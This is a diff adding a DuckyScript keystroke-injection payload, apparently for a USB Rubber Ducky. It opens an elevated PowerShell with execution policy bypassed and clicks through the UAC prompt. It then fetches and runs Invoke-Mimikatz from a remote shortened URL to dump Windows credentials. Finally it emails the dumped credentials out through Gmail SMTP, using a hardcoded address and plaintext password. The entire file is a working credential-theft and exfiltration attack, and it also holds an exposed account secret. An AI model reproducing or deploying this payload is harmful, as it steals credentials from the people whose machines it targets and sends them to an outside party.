@@ -1,0 +1,22 @@
+DELAY 500
+CAPSLOCK
+GUI R
+DELAY 500
+STRING powershell -c "start-process powershell -verb runas -argumentlist '-ex bypass'"
+ENTER
+DELAY 500
+LEFT
+ENTER
+DELAY 500
+STRING IEX (new-Object net.webclient).downloadstring('http://j.mp/imkatz')
+ENTER
+STRING $body = invoke-mimikatz -dumpcreds
+ENTER
+STRING $PasswordSecure = ConvertTo-SecureString  -String 'twtgwbqudvcvqprc' -AsPlainText -Force
+ENTER
+STRING $cred = new-object System.Management.Automation.PSCredential('kjacobsen@gmail.com', $PasswordSecure)
+ENTER
+STRING Send-MailMessage -Body $body -Subject "Katz" -SmtpServer "smtp.gmail.com"  -From "kjacobsen@gmail.com" -To "kieran@kjacobsen.net" -Credential $cred -UseSsl
+ENTER
+STRING exit
+ENTER
